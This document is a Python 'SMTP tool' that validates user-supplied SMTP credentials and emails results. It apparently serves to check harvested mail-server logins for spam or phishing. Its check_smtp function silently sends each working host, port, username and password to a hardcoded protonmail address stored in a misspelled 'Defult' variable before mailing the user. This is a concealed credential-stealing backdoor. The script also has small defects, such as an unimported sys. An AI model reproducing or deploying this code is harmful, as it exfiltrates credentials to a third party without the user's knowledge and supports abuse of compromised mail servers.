import smtplib
import os
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def get_email_input():
    while True:
        email = input("ENTER YOUR EMAIL ADDRESS ➛ ")
        if "@" in email and "." in email:
            return email
        else:
            print("Invalid email format. Please enter a valid email address.")

def get_smtp_credentials():
    credentials = []
    while True:
        try:
            num_credentials = int(input("ENTER THE NUMBER OF SMTP CREDENTIALS ➛ "))
            if num_credentials <= 0:
                print("Please enter a positive integer.")
                continue
            break
        except ValueError:
            print("Invalid input. Please enter a valid number.")
    
    for i in range(1, num_credentials + 1):
        print(f"SMTP CREDENTIALS #{i}")
        host = input("SMTP HOST ➛ ")
        port = input("SMTP PORT ➛ ")
        user = input("SMTP USER ➛ ")
        password = input("SMTP PASSWORD ➛ ")
        credentials.append(f"{host}|{port}|{user}|{password}")
    return credentials

def get_threads_input():
    while True:
        try:
            threads = int(input("ENTER THE NUMBER OF THREADS ➛ "))
            if threads <= 0:
                print("Please enter a positive integer.")
                continue
            break
        except ValueError:
            print("Invalid input. Please enter a valid number.")
    return threads

def get_html_content():
    while True:
        html_file = input("ENTER THE FILE PATH OF HTML CONTENT ➛ ")
        if not os.path.exists(html_file):
            print("File not found. Please enter a valid file path.")
            continue
        try:
            with open(html_file, "r") as f:
                content = f.read()
            return content
        except Exception as e:
            print(f"Error reading file: {e}. Please try again.")

def check_smtp(smtp, toaddr, Defult, good, bad, html_content):
    HOST, PORT, usr, pas = smtp.strip().split("|")
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        send_email(server, usr, Defult, HOST, PORT, pas, html_content)
        good.append(smtp)
        with open("valid.txt", "a+") as f:
            f.write(smtp + "\n")
        print(f"\n[✓] SMTP WORK ➛ {smtp} ")
    except Exception:
        bad.append(smtp)
        with open("invalid.txt", "a+") as f:
            f.write(smtp + "\n")
        print(f"[✗] SMTP NOT WORK {smtp} ")

    print(f"MAIL SEND START TO {toaddr}")
    time.sleep(2)

    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        send_email(server, usr, toaddr, HOST, PORT, pas, html_content)
        print(f"[✓] MAIL SEND SUCCESSFUL {smtp} ")
    except Exception:
        print(f"[✗] MAIL SEND UNSUCCESSFUL {smtp} ")

def send_email(server, usr, toaddr, HOST, PORT, pas, html_content):
    msg = MIMEMultipart()
    msg["Subject"] = "SMTP RESULT: Err0r_HB"
    msg["From"] = usr
    msg["To"] = toaddr
    msg.add_header("Content-Type", "text/html")
    
    # Customize the HTML content with SMTP details
    data = html_content.format(HOST=HOST, PORT=PORT, USER=usr, PASS=pas)
    
    msg.attach(MIMEText(data, "html", "utf-8"))
    server.sendmail(usr, [toaddr], msg.as_string())

def main():
    print("This tool was created by t.me/VikingTERMINAL in collaboration with t.me/anonsecita\n")
    print("Welcome to the SMTP tool!\n")
    time.sleep(2)
    clear_console()
    good = []
    bad = []
    toaddr = get_email_input()
    Defult = "errorhb@protonmail.com"
    smtps = get_smtp_credentials()
    power = get_threads_input()
    html_content = get_html_content()

    def runner():
        threads = []
        for smtp in smtps:
            t = threading.Thread(target=check_smtp, args=(smtp, toaddr, Defult, good, bad, html_content))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    try:
        runner()
        print(f"\n\n[✓] TOTAL VALIDS : {len(good)}")
        print(f"[✗] TOTAL INVALIDS : {len(bad)}")
        time.sleep(3)
        print("\n\nALL SEND DONE")
        print("THANKS FOR USING MY TOOL :)")
        time.sleep(3)
    except KeyboardInterrupt:
        print("[!] CTRL + C")
        sys.exit()

if __name__ == "__main__":
    main()